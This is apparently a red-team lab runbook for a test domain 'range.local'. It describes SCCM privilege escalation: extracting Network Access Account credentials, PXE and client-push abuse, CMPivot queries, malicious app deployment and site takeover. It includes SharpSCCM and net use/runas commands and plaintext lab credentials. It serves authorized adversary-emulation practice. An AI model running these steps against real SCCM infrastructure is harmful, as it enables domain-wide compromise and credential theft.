# CAMPAIGNS v3 — Branch C — SCCM Escalation (range.local)

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA-v2.md`](../CAMPAIGNS-METADATA-v2.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`archive/CAMPAIGNS.md`](../archive/CAMPAIGNS.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

### Branch C: SCCM Escalation (range.local)

> **Verification note (2026-08-01 — deep):** SCCM site `CAD` confirmed active on `mbr02` (build 9141). WT034 NAA extraction verified (vault bait file → `range\svc_naa` / `N@A_s3rv1c3!` = DA on dc03) AND confirmed in the provider (`SMS_SCI_ClientComp` Software Distribution `Network Access User Names = RANGE\svc_naa`). Deep surface validation 2026-08-01 as `range\svc_sccm` via **SMS Provider WMI with explicit creds** from ws01 (`root\SMS\site_CAD`): local `SMS Admins` membership (svc_sccm ✅, plus **cross-forest `CADRE\chief_command` + `analyst_purple`**), PXE **approved cert** (`SMS_PXECertificateInfo` SMSID `{256B7D4F-…}`, PXE server MBR02) + 2 boot images (x64 `CAD00002`/arm64 `CAD00005`), client-push component enabled, `SMS_Scripts.CreateScripts` works, `SMS_Package`+`SMS_Program` (SYSTEM) created. **CORRECTED constraints (2026-08-01):** (1) **AdminService IS deployed** (self-hosted `SMS_REST_PROVIDER` in `SMS_EXECUTIVE`, no IIS; `/AdminService/v1.0/` → 401 = up). CD chain verified to the ST (S4U2Proxy fixed: UAC `TrustedToAuthForDelegation`). **SPN owner FIXED + VERIFIED (2026-08-01):** the self-hosted AdminService always runs as LocalSystem and can only decrypt machine-account tickets → `HTTP/mbr02.range.local` MOVED to `mbr02$` (svc_sccm keeps decoy `HTTP/sccm.range.local` for WT033 Kerberoast; CD unchanged). Verified live: getST → ST encrypted to `mbr02$` → `AdminService/wmi/SMS_Site` → **200** as `administrator` (anon 401). WT037/039 auth gate CLOSED. (2) `SMS_Advertisement.Put` = Generic failure via raw WMI (needs console) — WT038 solved via the AdminService `SMS_Application` wmi passthrough (SCCMHunter-exact XML + escaped payload; `mp.msi` MP web-handler repair unblocked delivery), WT039 via AdminService script run — **both FULL EXEC VERIFIED 2026-08-02**. (3) **`cifs/mbr02.range.local` SPN missing** → SMB Kerberos to mbr02 broken (NTLM-only; verify-playbook candidate). Full PXE boot-image exploit (WT035) needs a real PXE client. Test objects cleaned up; provisioning restored.
>
> **SharpSCCM v2.0.13 notes (verified 2026-08-01):** v2 syntax uses `-mp`/`-sms` (not the v1 `-s`); `get naa`/`get secrets` = same command and requires a **computer account** (or PXE cert+media GUID) via the MP — NOT a user logon; `get admins`/`exec` use the **current session token** (no `-u/-p`) — run via Rubeus `createnetonly`/`asktgt /ptt` (requires `cifs` SPN for SMB; absent here) or replicate with PowerShell WMI + explicit creds (proven).

**Diverges from:** Phase 8 (cross-forest access gives `svc_sccm`).
**Converges to:** Phase 8 (NAA extraction gives range.local DA).
**SCCM Site Server:** mbr02 (192.168.77.23) — site code `CAD`.

`svc_sccm` is SCCM Full Administrator on the `CAD` site. From this position:

#### NAA Credential Extraction (WT034) — Fastest to DA

Verified live (2026-07-29). `svc_sccm` / `s3rv1c3_SCCM!` has read access to the `vault` share on `mbr02` and the NAA file `naa-rotation-notice.txt`.

```powershell
# From ws01 or mbr01 as any child domain user with network reachability
net use \\mbr02.range.local\vault /user:range.local\svc_sccm s3rv1c3_SCCM!
type \\mbr02.range.local\vault\naa-rotation-notice.txt
# Contains: Network Access Account RANGE\svc_naa : N@A_s3rv1c3!

# Verify svc_naa is Domain Admin on dc03
runas /netonly /user:range.local\svc_naa cmd
whoami /groups
```

SharpSCCM equivalent (not exercised):
```powershell
SharpSCCM.exe get naa -s mbr02.range.local
```

#### Full SCCM Attack Chain (WT034–039 — Plan 1.1 first-class)

> **Do not stop at NAA.** Automate/verify WT035–039 as Branch C graph nodes (SharpSCCM staged via **ws01** primary path; P-FOREST VMs required).

| WT# | Attack            | Command                                                 | What it does                     | Plan 1.1 |
| --- | ----------------- | ------------------------------------------------------- | -------------------------------- | -------- |
| 034 | NAA Extraction    | `SharpSCCM.exe get naa -s mbr02.range.local`            | `RANGE\svc_naa` DA creds         | Spine P8 + Branch C |
| 035 | PXE Boot Abuse    | `SharpSCCM get pxe -s mbr02`                            | Extract boot image + creds       | Branch C |
| 036 | Client Push Relay | `SharpSCCM client-push -s mbr02 -t 192.168.77.22`       | Relay to SMB target              | Branch C |
| 037 | CMPivot Abuse     | `SharpSCCM invoke cmpivot -s mbr02 -q "..."`            | Arbitrary queries on all clients | Branch C |
| 038 | App Deployment    | `SharpSCCM exec -s mbr02 -t all -c "..."`               | Deploy malicious app to all      | Branch C |
| 039 | Site Takeover     | `SharpSCCM invoke script -s mbr02 -t mbr02 -c "whoami"` | Execute on site server           | Branch C (HITL gate) |


#### Additional Auxiliary Attacks


| WT# | Attack         | Relevant Domain                         |
| --- | -------------- | --------------------------------------- |
| 030 | WSUS Abuse     | range.local                             |
| 049 | VSC Enrollment | Certificate enrollment via VSC template |


---

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-branch-b.md`](CAMPAIGNS-RUNBOOK-branch-b.md) · Next: [`CAMPAIGNS-RUNBOOK-branch-d.md`](CAMPAIGNS-RUNBOOK-branch-d.md) →
